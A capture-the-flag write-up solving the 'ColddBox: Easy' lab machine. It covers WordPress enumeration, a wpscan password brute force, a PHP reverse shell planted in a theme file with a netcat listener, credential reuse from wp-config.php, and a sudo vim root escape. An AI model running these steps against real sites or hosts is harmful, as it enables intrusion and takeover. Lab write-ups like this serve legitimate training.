# ColddBox: Easy — CTF Write-up

**IP:** 10.145.146.23  
**By:** obada  

---

## 1. Nmap Scan

first i start with nmap scan

```bash
sudo nmap -sCV -O -T4 -A -Pn 10.145.146.23 -oN nmap-result.nmap
```

**Findings:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18
4512/tcp open  ssh     OpenSSH 7.2p2
```

i found 2 open ports:
- port 80 → http (Apache)
- port 4512 → ssh (non-standard port, noted for later)

OK found that the web site powered by WordPress

---

## 2. WordPress Enumeration

Using wpscan, I scanned the WordPress instance for vulnerabilities and user enumeration:

```bash
wpscan --url http://10.145.146.23 -e
```

**Findings:**
- WordPress version: **4.1.31**
- WordPress theme in use: **twenty fifteen**
- Users: `c0ldd`, `hugo`, `philip`

To attempt brute-force login:

```bash
wpscan --url http://10.145.146.23/wp-login.php -U c0ldd,hugo,philip -P /usr/share/wordlists/rockyou.txt
```

Successful credentials:

```
[SUCCESS] - c0ldd / 9876543210
```

---

## 3. Initial Access — Reverse Shell

entered the WordPress dashboard. Access **Appearance > Editor**, then replaced `404.php` with a reverse shell.  
I used the PHP reverse shell from: https://github.com/pentestmonkey/php-reverse-shell

get your tun0 IP first:

```bash
ip a | grep tun0
```

then start netcat listener:

```bash
nc -lvnp <port>
```

trigger the shell:

```
http://10.145.146.23/wp-content/themes/twentyfifteen/404.php
```

Bingo we have a shell now

```bash
$ whoami
www-data
$ cd /home && ls
c0ldd
$ cd c0ldd && ls
user.txt
$ cat user.txt
cat: user.txt: Permission denied
```

can't read the file — need to escalate to c0ldd first.

---

## 4. Lateral Movement — wp-config.php

searched for the WordPress config file:

```bash
find / -name "wp-config.php" 2>/dev/null
```

```
/var/www/html/wp-config.php
```

opened it and found database credentials:

```php
define('DB_NAME',     'colddbox');
define('DB_USER',     'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
define('DB_HOST',     'localhost');
```

tried those credentials to SSH in on the non-standard port we found earlier:

```bash
ssh c0ldd@10.145.146.23 -p 4512
```

---

## 5. User Flag

```bash
c0ldd@ColddBox-Easy:~$ cat user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

c0ldd@ColddBox-Easy:~$ echo "RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==" | base64 -d
Felicidades, primer nivel conseguido!
```

---

## 6. Privilege Escalation

checked sudo permissions:

```bash
c0ldd@ColddBox-Easy:~$ sudo -l
```

```
User c0ldd may run the following commands on ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

we have vim — it well be so easy ;)  
vim allows shell command execution directly, so via GTFOBins:

```bash
sudo vim -c ':!/bin/bash'
```

```bash
root@ColddBox-Easy:~# whoami
root
```

---

## 7. Root Flag

```bash
root@ColddBox-Easy:~# find / -name root.txt 2>/dev/null
/root/root.txt

root@ColddBox-Easy:~# cat /root/root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=

root@ColddBox-Easy:~# echo "wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=" | base64 -d
¡Felicidades, máquina completada!
```

---

## 8. Lessons Learned

- wp-config.php is always worth checking — it often holds credentials reused elsewhere
- SSH isn't always on port 22, nmap full scan catches non-standard ports
- `sudo -l` is the first thing to check after getting a user shell
- GTFOBins: vim + sudo = instant root
